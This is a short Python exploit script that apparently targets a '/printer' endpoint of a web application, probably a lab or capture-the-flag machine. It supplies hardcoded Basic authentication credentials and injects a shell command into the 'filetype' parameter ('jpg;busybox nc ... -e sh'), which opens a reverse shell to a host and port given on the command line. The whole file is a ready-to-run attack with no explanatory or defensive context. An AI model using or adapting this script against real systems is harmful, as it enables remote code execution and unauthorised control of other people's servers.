import requests
import sys

if len(sys.argv) < 4:
    print("python3 <rce.py> <url> <lhost> <lport>")
    sys.exit(1)

base_url = sys.argv[1].rstrip('/')
lhost = sys.argv[2]
lport = sys.argv[3]

target_url = f"{base_url}/printer"

headers = {
    "Authorization": "Basic cEgwdDA6YjBNYiE=",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

payload = f"busybox nc {lhost} {lport} -e sh"


params = {"photo":"voicu-apostol-MWER49YaD-M-unsplash.jpg","filetype":f"jpg;{payload}","dimensions":"3000x2000"}

try:
    res = requests.post(target_url, headers=headers, params=params)
    print(f"[#] Status Code: {res.status_code}")
    print("[#] Response budy: ")
    print(res.text)
except Exception as e:
    print(f"[!] Error : {e}")
